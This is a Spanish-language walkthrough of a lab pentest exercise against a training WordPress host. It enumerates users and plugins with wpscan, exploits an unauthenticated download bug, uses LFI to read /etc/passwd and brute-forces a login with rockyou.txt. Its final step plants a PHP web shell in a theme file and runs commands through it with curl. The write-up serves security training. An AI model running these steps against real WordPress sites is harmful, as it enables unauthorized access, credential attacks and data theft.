---
description: 'Target(s): 10.129.2.37 (ACADEMY-MISC-NIX01)'
---

# WordPress

## Escenario

Te han contratado para hacer un pentest externo a la compañía INLANEFREIGHT que hostea uno de sus sitios web en WordPress.

Hay que realizar enumeración del objetivo a través de lo aprendido en el módulo para encontrar todas las flags. Obtener un acceso shell al servidor web para encontrar la última flag.

Nota: Hay que tener conocimiento sobre cómo mapea Linux los DNS cuando falta un name server.

**Pregunta 1**: Identifica el número de versión de WordPress.

1. Añadimos el host objetivo a /etc/hosts

```
sudo nano /etc/hosts

10.129.2.37 inlanefreight.htb
```

<figure><img src="../../../../.gitbook/assets/image (310).png" alt=""><figcaption></figcaption></figure>

2. Comprobamos que llegamos y recibimos el index con:

```
curl http://inlanefreight.htb
```

3. Descubrimos el enlace blog.inlanefreight.local, lo que indica que el WordPress está alojado ahí. Lo añadiremos a /etc/hosts:

<figure><img src="../../../../.gitbook/assets/image (312).png" alt=""><figcaption></figcaption></figure>

4. Probamos acceso a blog.inlanefreight.local:

```
curl http://blog.inlanefreight.local
```

5. Nos devuelve el index de blog.inlanefreight.local, esto quiere decir que lo alcanzamos correctamente.
6. Enumeramos la versión de WordPress:

```
curl -s http://blog.inlanefreight.local | grep -i generator
```

<figure><img src="../../../../.gitbook/assets/image (313).png" alt=""><figcaption></figcaption></figure>

**Pregunta 2:** Identifica el tema de WordPress que está en uso.

1. Buscaremos identificar el tema que se está utilizando con el siguiente comando:

```
curl -s http://blog.inlanefreight.local | grep -o "wp-content/themes/[^/']*"
```

<figure><img src="../../../../.gitbook/assets/image (316).png" alt=""><figcaption></figcaption></figure>

**Pregunta 3**: Envía el contenido del archivo flag en el directorio con el listado de directorios habilitado.

1. Vamos a buscar en los directorios donde puede haber contenido y lo mostramos con HTML:

```
curl http://blog.inlanefreight.local/wp-content/uploads/ | html2text
```

<figure><img src="../../../../.gitbook/assets/image (314).png" alt=""><figcaption></figcaption></figure>

2. Localizamos el archivo upload\_flag.txt y lo mostramos:

```
curl http://blog.inlanefreight.local/wp-content/uploads/upload_flag.txt
```

<figure><img src="../../../../.gitbook/assets/image (315).png" alt=""><figcaption></figcaption></figure>

**Pregunta 4**: Identifique al único usuario de WordPress que no sea administrador. (Formato: \<first-name>\<last-name>)

1. Para identificar el usuario no admin, indagamos en el blog y encontramos un author de un post que es el usuario erika. Clicamos en su perfil y nos fijamos en la URL.

<figure><img src="../../../../.gitbook/assets/image (317).png" alt=""><figcaption></figcaption></figure>

2. Utilizamos wpscan para enumerar usuarios:

```
wpscan --url http://blog.inlanefreight.local --enumerate u
```

<figure><img src="../../../../.gitbook/assets/image (318).png" alt=""><figcaption></figcaption></figure>

**Pregunta 5**: Utiliza un plugin vulnerable para descargar un archivo que contiene una flag, a través de una descarga de archivos no autenticada.

**Target**(s): 10.129.242.154 (ACADEMY-MISC-NIX01)

1. Añado la nueva IP objetivo (porque reinicie el laboratorio) al archivo /etc/hosts:

```
sudo sh -c ‘echo "10.129.242.154 inlanefreight.local blog.inlanefreight.local" >> /etc/hosts’
```

<figure><img src="../../../../.gitbook/assets/image (319).png" alt=""><figcaption></figcaption></figure>

2. Tenemos que fijarnos en el análisis de WPScan, pero en este caso hay que hacerlo utilizando un token de API de WPScan, así que vamos a solicitarlo a la página oficial:

<figure><img src="../../../../.gitbook/assets/image (321).png" alt=""><figcaption></figcaption></figure>

3. Guardamos el API token y montamos el siguiente comando:

```
wpscan --url http://blog.inlanefreight.local --enumerate --api-token TOKEN_API
```

<figure><img src="../../../../.gitbook/assets/image (322).png" alt=""><figcaption></figcaption></figure>

4. Identificamos la siguiente vulnerabilidad con el escaneo:

<figure><img src="../../../../.gitbook/assets/image (323).png" alt=""><figcaption></figcaption></figure>

5. Vamos a exploit-db al enlace de esta vulnerabilidad y encontramos como explotarla:

{% embed url="https://www.exploit-db.com/exploits/48698" %}

<figure><img src="../../../../.gitbook/assets/image (324).png" alt=""><figcaption></figcaption></figure>

```
curl 'http://blog.inlanefreight.local/wp-admin/admin.php?page=download_report&report=users&status=all'
```

<figure><img src="../../../../.gitbook/assets/image (325).png" alt=""><figcaption></figcaption></figure>

**Pregunta 6**: ¿Cuál es el número de versión del plugin vulnerable a una LFI?

1. Para la versión del plugin LFI, sacamos los plugins y sus versiones:

```
wpscan --url http://blog.inlanefreight.local --enumerate p
```

* Identificamos el plugin vulnerable a LFI y anotamos su versión.

**Pregunta 7**: Utilice el LFI para identificar a un usuario del sistema cuyo nombre comience por la letra «f».

1. Creamos un archivo para enumeración de usuarios a través del archivo /etc/passwd, en mi caso lo he llamado _lfi\_site\_editor.sh:_

```
sudo nano lfi_site_editor.sh

sudo chmod +x lfi_site_editor.sh
./lfi_site_editor.sh
```

<figure><img src="../../../../.gitbook/assets/image (326).png" alt=""><figcaption></figcaption></figure>

2. Al utilizar el script hemos listado los usuarios e identificamos uno que empieza por f:

<figure><img src="../../../../.gitbook/assets/image (327).png" alt=""><figcaption></figcaption></figure>

**Pregunta 8**: Obtén un shell en el sistema y envíe el contenido de la flag que hay en el directorio /home/erika.

1. Para conseguir las credenciales del usuario erika, que es el que nos piden para subir la reverse shell, haremos un ataque de fuerza bruta con wpscan utilizando rockyou.txt.
2. Primero localizamos y descomprimimos rockyou.txt:

<figure><img src="../../../../.gitbook/assets/image (331).png" alt=""><figcaption></figcaption></figure>

3. También se puede descomprimir en la otra ruta y movernos hasta ella para utilizarlo:

<figure><img src="../../../../.gitbook/assets/image (332).png" alt=""><figcaption></figcaption></figure>

4. Montamos el comando con WPScan:

```
wpscan --password-attack xmlrpc -t 20 -U erika -P ./rockyou.txt --url http://blog.inlanefreight.local
```

<figure><img src="../../../../.gitbook/assets/image (333).png" alt=""><figcaption></figcaption></figure>

5. Encontramos la credenciales de erika:

<figure><img src="../../../../.gitbook/assets/image (334).png" alt=""><figcaption></figcaption></figure>

6. Desde el navegador accedemos a blog.inlanefreight.local/wp-admin y hacemos login con las credenciales:

<figure><img src="../../../../.gitbook/assets/image (335).png" alt=""><figcaption></figcaption></figure>

7. En el menú lateral izquierdo vamos a Appearence > Theme Editor:

<figure><img src="../../../../.gitbook/assets/image (336).png" alt=""><figcaption></figcaption></figure>

8. En el menú lateral derecho, donde aparecen los archivos del tema, seleccionamos el tema TwentySeventeen, el template 404 y en el código escribimos la línea system($\_GET\['cmd']); para obtener una shell inversa y hacemos click en Update File:

<figure><img src="../../../../.gitbook/assets/image (337).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (338).png" alt=""><figcaption></figcaption></figure>

9. Ahora desde el terminal confirmaremos la ejecución de código remoto (RCE):

```
curl -X GET "http://blog.inlanefreight.local/wp-content/themes/twentyseventeen/404.php?cmd=id"
```

<figure><img src="../../../../.gitbook/assets/image (339).png" alt=""><figcaption></figcaption></figure>

10. Este comando responde bien, pero si hay espacios o más carácteres, nos dará error:

<figure><img src="../../../../.gitbook/assets/image (340).png" alt=""><figcaption></figcaption></figure>

11. Lo encodeamos en formato URL y ejecutamos de nuevo:

<figure><img src="../../../../.gitbook/assets/image (341).png" alt=""><figcaption></figcaption></figure>

12. Listaremos los archivos del directorio indicado en la pregunta /home/erika:

```
curl -X GET "http://blog.inlanefreight.local/wp-content/themes/twentyseventeen/404.php?cmd=ls%20-al%20%2Fhome%2Ferika"
```

<figure><img src="../../../../.gitbook/assets/image (343).png" alt=""><figcaption></figcaption></figure>

13. Localizamos el archivo flag y lo mostramos:

```
curl -X GET "http://blog.inlanefreight.local/wp-content/themes/twentyseventeen/404.php?cmd=cat%20%2Fhome%2Ferika%2F_flag.txt"
```

<figure><img src="../../../../.gitbook/assets/image (344).png" alt=""><figcaption></figcaption></figure>
